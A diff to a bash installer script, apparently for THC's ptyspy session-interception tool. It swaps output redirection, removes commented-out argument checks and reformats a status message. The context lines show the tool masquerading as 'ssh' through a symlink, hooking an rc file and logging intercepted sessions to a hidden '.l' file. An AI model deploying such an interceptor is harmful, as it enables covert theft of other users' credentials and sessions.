@@ -22,7 +22,7 @@ fi
 
 OK_OUT()
 {
-	echo -e 1>&2 "......[${CG}OK${CN}]"
+	echo -e 2>&1 "......[${CG}OK${CN}]"
 	[[ -n "$1" ]] && echo -e 1>&2 "--> $*"
 }
 
@@ -104,13 +104,6 @@ osarch()
 }
 
 [[ "$1" = "osarch" ]] && { osarch; exit; }
-
-# if [[ -n $1 ]]; then
-# 	[[ "$1" = "osarch" ]] && valid_param=1
-# 	[[ "$1" = "uninstall" ]] && valid_param=1
-# 	[[ "$1" = "clean" ]] && valid_param=1
-# 	[[ -z $valid_param ]] && 
-# fi
 
 [[ -n $THC_LOCAL ]] && echo -en 2>&1 "Installing binaries..................................................."
 
@@ -228,17 +221,12 @@ ln -sf "ptyspy_bin.${OSARCH}" "${THC_BASEDIR}/ssh"
 
 if [[ -n $THC_LOCAL ]]; then
 	OK_OUT
-	echo -e "--> Installed to ${CY}${THC_BASEDIR}${CN} and ${CY}${RCFILE}${CN}.
---> Logging to ${CY}${THC_BASEDIR}/.l${CN}
---> Type ${CC}${THC_BASEDIR}/x.sh uninstall${CN} to remove.
---> Intercepting will start on next log in or to start right
-    now type ${CC}source ${THC_BASEDIR}/seed${CN}."
-
-	# echo -e "--> Installed to ${CY}${THC_BASEDIR}${CN} and ${CY}${RCFILE}${CN}."
-	# echo -e "--> Logging to ${CY}${THC_BASEDIR}/.l${CN}"
-	# echo -e "--> Type ${CC}${THC_BASEDIR}/x.sh uninstall${CN} to remove."
-	# echo -e "--> Intercepting will start on next log in or to start right"
-	# echo -e "    now type ${CC}source ${THC_BASEDIR}/seed${CN}."
+	echo -e 2>&1 ""\
+"--> Installed to ${CY}${THC_BASEDIR}${CN} and ${CY}${RCFILE}${CN}.\n"\
+"--> Logging to ${CY}${THC_BASEDIR}/.l${CN}\n"\
+"--> Type ${CC}${THC_BASEDIR}/x.sh uninstall${CN} to remove.\n"\
+"--> Intercepting will start on next log in or to start right\n"\
+"    now type ${CC}source ${THC_BASEDIR}/seed${CN}."
 fi
 
 exit 0
